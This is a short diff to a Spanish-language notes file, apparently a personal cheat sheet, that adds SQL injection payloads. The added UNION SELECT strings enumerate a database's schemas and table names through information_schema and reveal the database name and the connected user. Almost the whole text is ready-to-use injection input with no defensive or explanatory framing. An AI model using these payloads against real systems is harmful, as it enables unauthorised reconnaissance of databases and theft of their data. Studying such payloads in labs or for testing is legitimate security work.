@@ -9,3 +9,11 @@ Para obtener un username
 Para obtener nombres de las tablas
 1 UNION SELECT table_schema, 1, table_name,2 FROM information_schema.tables
 
+Para obtener estructura de la bd
+
+1 UNION SELECT table_name,table_name, table_name,table_name FROM information_schema.tables;
+1 UNION SELECT 1,2,concat(table_schema, table_name),4 FROM information_schema.tables;
+
+Nombre de la DB
+1 UNION ALL SELECT 1,2,DATABASE(),4
+1 UNION ALL SELECT 1,2,user(),4
